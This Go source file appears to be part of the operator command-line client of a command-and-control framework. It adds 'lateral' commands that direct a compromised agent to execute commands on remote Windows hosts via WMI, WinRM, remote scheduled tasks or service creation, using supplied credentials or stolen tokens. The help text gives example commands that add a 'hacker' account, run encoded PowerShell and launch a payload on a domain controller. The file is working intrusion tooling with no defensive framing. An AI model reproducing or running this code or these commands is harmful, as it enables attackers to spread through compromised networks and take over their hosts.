package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

// lateralPost sends a lateral movement request and optionally waits for result.
func lateralPost(agentID, method string, payload map[string]interface{}, wait bool, timeout int) {
	raw, _ := json.Marshal(payload)
	body, err := makeAPIRequestWithMethod("POST",
		"/api/v1/agent/"+agentID+"/lateral/"+method,
		bytes.NewBuffer(raw), "application/json")
	if err != nil {
		printError(fmt.Sprintf("lateral %s failed: %v", method, err))
		os.Exit(1)
	}
	var resp APIResponse
	if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
		msg := resp.Error
		if msg == "" {
			msg = "unknown error"
		}
		printError(fmt.Sprintf("lateral %s failed: %s", method, msg))
		os.Exit(1)
	}
	dataMap, _ := resp.Data.(map[string]interface{})
	cmdID, _ := dataMap["command_id"].(string)
	target, _ := dataMap["target"].(string)
	printSuccess(fmt.Sprintf("Lateral %s queued → %s  (cmd %s)", method, target, cmdID))
	if wait && cmdID != "" {
		printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
		if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
			displayFinalCommandStatus(finalData, cmdID)
		}
	}
}

// ── lateral parent ─────────────────────────────────────────────────────────────

var lateralCmd = &cobra.Command{
	Use:   "lateral",
	Short: "Lateral movement — execute command on a remote host via agent",
	Long: `Execute commands on remote Windows hosts using the compromised agent as a pivot.
The agent runs the command using the specified technique (WMI, WinRM, Schtask, Service).

Credentials are optional — if omitted, the agent's current security token is used
(impersonated token, pass-the-hash, etc.).`,
}

// ── lateral wmi ───────────────────────────────────────────────────────────────

var lateralWMICmd = &cobra.Command{
	Use:   "wmi <agent-id> <rhost> <command>",
	Short: "Execute command on remote host via WMI (wmic.exe process call create)",
	Long: `Uses wmic.exe to invoke Win32_Process.Create on the remote host.
No service creation, no disk artefact — output is not captured (fire-and-forget).

Examples:
  lateral wmi 7d019eb7 192.168.1.100 "cmd.exe /c whoami > C:\Temp\out.txt"
  lateral wmi 7d019eb7 DC01 "powershell -enc <B64>" --user john --domain CORP --pass 'P@ss'`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		user, _ := cmd.Flags().GetString("user")
		domain, _ := cmd.Flags().GetString("domain")
		pass, _ := cmd.Flags().GetString("pass")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		lateralPost(agentID, "wmi", map[string]interface{}{
			"target": args[1], "command": args[2],
			"user": user, "domain": domain, "pass": pass,
		}, wait, timeout)
	},
}

// ── lateral winrm ─────────────────────────────────────────────────────────────

var lateralWinRMCmd = &cobra.Command{
	Use:   "winrm <agent-id> <rhost> <command>",
	Short: "Execute command on remote host via WinRM (Invoke-Command)",
	Long: `Uses PowerShell Invoke-Command (PSRemoting / WinRM) to run the command
on the remote host. Requires WinRM enabled on target (port 5985/5986).
Output is captured and returned.

Examples:
  lateral winrm 7d019eb7 192.168.1.100 "whoami; hostname" --wait
  lateral winrm 7d019eb7 FS01 "ipconfig /all" --user admin --domain CORP --pass 'P@ss' --wait`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		user, _ := cmd.Flags().GetString("user")
		domain, _ := cmd.Flags().GetString("domain")
		pass, _ := cmd.Flags().GetString("pass")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		lateralPost(agentID, "winrm", map[string]interface{}{
			"target": args[1], "command": args[2],
			"user": user, "domain": domain, "pass": pass,
		}, wait, timeout)
	},
}

// ── lateral schtask ───────────────────────────────────────────────────────────

var lateralSchtaskCmd = &cobra.Command{
	Use:   "schtask <agent-id> <rhost> <command>",
	Short: "Execute command on remote host via remote scheduled task (schtasks.exe)",
	Long: `Creates a one-time scheduled task on the remote host, runs it immediately,
then deletes it. Works when WMI/WinRM is blocked but schtasks RPC is open.
Fire-and-forget — output is not captured.

Examples:
  lateral schtask 7d019eb7 192.168.1.100 "cmd.exe /c net user hacker P@ss /add"
  lateral schtask 7d019eb7 FS01 "powershell -enc <B64>" --user admin --domain CORP --pass 'P@ss'`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		user, _ := cmd.Flags().GetString("user")
		domain, _ := cmd.Flags().GetString("domain")
		pass, _ := cmd.Flags().GetString("pass")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		lateralPost(agentID, "schtask", map[string]interface{}{
			"target": args[1], "command": args[2],
			"user": user, "domain": domain, "pass": pass,
		}, wait, timeout)
	},
}

// ── lateral service ───────────────────────────────────────────────────────────

var lateralServiceCmd = &cobra.Command{
	Use:   "service <agent-id> <rhost> <command>",
	Short: "Execute command on remote host via SCM service (sc.exe)",
	Long: `Creates a Windows service on the remote host via SCM RPC (sc.exe),
starts it, waits briefly, then stops and deletes it. Requires admin on target.
Fire-and-forget — output is not captured.

Examples:
  lateral service 7d019eb7 192.168.1.100 "cmd.exe /c net user hacker P@ss /add"
  lateral service 7d019eb7 DC01 "C:\Temp\payload.exe"`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		user, _ := cmd.Flags().GetString("user")
		domain, _ := cmd.Flags().GetString("domain")
		pass, _ := cmd.Flags().GetString("pass")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		lateralPost(agentID, "service", map[string]interface{}{
			"target": args[1], "command": args[2],
			"user": user, "domain": domain, "pass": pass,
		}, wait, timeout)
	},
}

// initLateralFlags registers flags for all lateral subcommands.
func initLateralFlags() {
	for _, c := range []*cobra.Command{
		lateralWMICmd, lateralWinRMCmd, lateralSchtaskCmd, lateralServiceCmd,
	} {
		c.Flags().String("user", "", "Remote username (empty = current token)")
		c.Flags().String("domain", "", "Domain (empty = local / WORKGROUP)")
		c.Flags().String("pass", "", "Password")
		c.Flags().Bool("wait", false, "Wait for result")
		c.Flags().Int("timeout", 120, "Wait timeout (seconds)")
	}
}
